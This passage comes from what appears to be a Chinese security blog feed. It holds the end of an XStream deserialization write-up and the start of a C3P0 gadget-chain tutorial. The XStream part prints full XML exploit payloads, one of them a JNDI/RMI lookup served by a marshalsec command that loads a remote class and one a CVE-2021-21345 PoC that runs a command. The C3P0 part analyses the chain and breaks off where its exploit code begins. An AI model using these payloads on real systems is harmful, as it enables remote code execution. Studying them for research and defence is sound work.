class="hljs-string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">packet</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">message</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">bi</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">jaxbType</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">uriProperties</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">attributeProperties</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">inheritedAttWildcard</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">getter</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>getDatabaseMetaData<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">getter</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">inheritedAttWildcard</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">bi</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">tagName</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">context</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">marshallerPool</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&#x27;../..&#x27;</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">marshallerPool</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">nameList</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">localNames</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">localNames</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">nameList</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">context</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">jaxbObject</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">javax.sql.rowset.BaseRowSet</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">concurrency</span>&gt;</span>1008<span class="hljs-tag">&lt;/<span class="hljs-name">concurrency</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">escapeProcessing</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">escapeProcessing</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">fetchDir</span>&gt;</span>1000<span class="hljs-tag">&lt;/<span class="hljs-name">fetchDir</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">fetchSize</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">fetchSize</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">isolation</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">isolation</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">maxFieldSize</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">maxFieldSize</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">maxRows</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">maxRows</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">queryTimeout</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">queryTimeout</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">readOnly</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">readOnly</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">rowSetType</span>&gt;</span>1004<span class="hljs-tag">&lt;/<span class="hljs-name">rowSetType</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">showDeleted</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">showDeleted</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span>&gt;</span>rmi://127.0.0.1:1099/exp<span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">params</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">javax.sql.rowset.BaseRowSet</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">iMatchColumns</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">iMatchColumns</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">strMatchColumns</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">strMatchColumns</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">jaxbObject</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">satellites</span>/&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">invocationProperties</span>/&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">packet</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">indexMap</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">comparator</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里打的是jndi注入</p><p>那我们就需要起一个恶意的rmi服务，这里用marshalsec来起服务</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">java -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8888</span>/#exp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106152810804.png" alt="image-20241106152810804"></p><p>web服务下有一个计算器的exp.class</p><p><img src="https://cdn.clown2024.cn/image-20241106153040392.png" alt="image-20241106153040392"></p><h2 id="cve-2021-21345远程代码执行漏洞"><a href="#CVE-2021-21345远程代码执行漏洞" class="headerlink" title="CVE-2021-21345远程代码执行漏洞"></a>CVE-2021-21345远程代码执行漏洞</h2><p>影响版本&lt;&#x3D;1.4.15</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">unserializable-parents</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">size</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">size</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">comparator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">indexMap</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">packet</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">message</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">bi</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="hljs-tag">&lt;/<span class="hljs-name">jaxbType</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">uriProperties</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">attributeProperties</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">inheritedAttWildcard</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">getter</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>verify<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">getter</span>&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">inheritedAttWildcard</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">bi</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">tagName</span>/&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">context</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">marshallerPool</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&#x27;../..&#x27;</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">marshallerPool</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">nameList</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">localNames</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">localNames</span>&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">nameList</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">context</span>&gt;</span><br>                  <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">jaxbObject</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">activationCmd</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">activationCmd</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">jaxbObject</span>&gt;</span><br>              <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">satellites</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">invocationProperties</span>/&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">packet</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">indexMap</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">comparator</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106153336587.png" alt="image-20241106153336587"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></p><p><a href="https://xz.aliyun.com/t/11372?u_atoken=d255e03184aefd4a575a1a82fa1faa70&u_asig=1a0c399d17307034326662515e00b6&time__1311=n4+xyie7wxg0GODlxGrzGWwxYqGKG8AlD0O+iD">https://xz.aliyun.com/t/11372?u_atoken=d255e03184aefd4a575a1a82fa1faa70&amp;u_asig=1a0c399d17307034326662515e00b6&amp;time__1311=n4%2Bxyie7wxg0GODlxGrzGWwxYqGKG8AlD0O%2BiD</a></p><p>后面版本的修复都是黑白名单的形式来修复，这篇文章总结的更加详细：<a href="https://tttang.com/archive/1699/">https://tttang.com/archive/1699/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xstream介绍&quot;&gt;&lt;a href=&quot;#XStream介绍&quot; class=&quot;headerlink&quot; title=&quot;XStream介绍&quot;&gt;&lt;/a&gt;XStream介绍&lt;/h1&gt;&lt;p&gt;XStream是一个简单的基于Java库，能够将Java对象和xml文档之间进行相互</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>C3P0利用链学习</title>
    <link href="https://clowsman.github.io/2024/11/01/C3P0%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/11/01/C3P0%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-01T04:34:42.000Z</published>
    <updated>2024-12-03T13:09:21.916Z</updated>
    
    <content type="html"><![CDATA[<h1 id="c3p0介绍"><a href="#C3P0介绍" class="headerlink" title="C3P0介绍"></a>C3P0介绍</h1><p>C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。</p><p>JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。<br>使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。</p><p>连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.mchange/c3p0 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mchange<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>C3P0的常见利用方式有三种：</p><ul><li>URLClassLoader远程类加载</li><li>JNDI注入</li><li>利用HEX序列化字节加载器进行反序列化攻击</li></ul><h2 id="urlclassloader远程类加载"><a href="#URLClassLoader远程类加载" class="headerlink" title="URLClassLoader远程类加载"></a>URLClassLoader远程类加载</h2><p>调用链</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PoolBackedDataSourceBase#readObject -&gt;<br>ReferenceSerialized#getObject -&gt;<br>ReferenceableUtils#referenceToObject -&gt;<br>ObjectFactory#getObjectInstance<br></code></pre></td></tr></table></figure><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>首先来看PoolBackedDataSourceBase#readObject方法</p><p><img src="https://cdn.clown2024.cn/image-20241101134337171.png" alt="image-20241101134337171"></p><p>漏洞的触发入口就在这，如果反序列化得到的Object为IndirectlySerialized，就会调用其getObject方法</p><p>IndirectlySerialized是一个接口，他的实现类就是ReferenceSerialized，那接下来去看看他的getObject方法</p><p><img src="https://cdn.clown2024.cn/image-20241101135245450.png" alt="image-20241101135245450"></p><p>ReferenceSerialized类是ReferenceIndirector的一个内部类，而且可以看到这里其实已经出现了initialContext.lookup方法，但是我们在反序列化的时候其实是无法调用该方法的，因为contextName默认为null且不可控</p><p>那继续往下看ReferenceableUtils#referenceToObject方法</p><p><img src="https://cdn.clown2024.cn/image-20241101135741940.png" alt="image-20241101135741940"></p><p>可以看到这里就利用了URLClassLoader来进行远程类加载，只需要我们设置远程工厂类地址<code>fClassLocation</code></p><p>那现在还有一个问题，我们要如何构造ReferenceSerialized这个类呢，这个类从上面我们可以知道是一个私有的类，我们无法直接获取，那就看一下有谁调用了他的构造方法</p><p><img src="https://cdn.clown2024.cn/image-20241101185304051.png" alt="image-20241101185304051"></p><p>可以发现在外部类ReferenceIndirector#indirectForm方法里面进行了调用</p><p><img src="https://cdn.clown2024.cn/image-20241101185405398.png" alt="image-20241101185405398"></p><p>但是这个方法我们不方便调用，所以继续往上找，发现在PoolBackedDataSourceBase#writeObject方法里面进行了调用，所以我们在正常序列化的流程中就可以完成这个操作</p><p><img src="https://cdn.clown2024.cn/image-20241101190429527.png" alt="image-20241101190429527"></p><p>这里其实有两个indirectForm方法的调用，但是我们选择这个参数为ConnectionPoolDataSource的方法</p><p>我们可以看一下他走到这里的逻辑，可以看到他先尝试序列化ConnectionPoolDataSource，如果抛出不能反序列化的异常，他就会调用这个indirectForm方法</p><p>我们看一下这个类</p><p><img src="https://cdn.clown2024.cn/image-20241101191307567.png" alt="image-20241101191307567"></p><p>它本身是没有实现序列化接口的，那么我们只要找一个他的实现类且没有实现序列化接口就可以抛出异常，从而走到indirectForm方法的逻辑，或者自己实现这个接口也可以</p><h3 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h3><p>那现在我们就可以进行exp的编写了</p><p>这里采用自己实现ConnectionPoolDataSource接口的方法，而且这里我们还需要自己实现一个Referenceable接口，因为indirectForm方法里面传入Reference对象的方式不太一样</p><p><img src="https://cdn.clown2024.cn/image-20241101193611019.png" alt="image-20241101193611019"></p><p>这里是调用一个getReference方法来获取Reference对象的</p><p>最终exp如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0_URLClassloader</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_Loader</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable&#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span 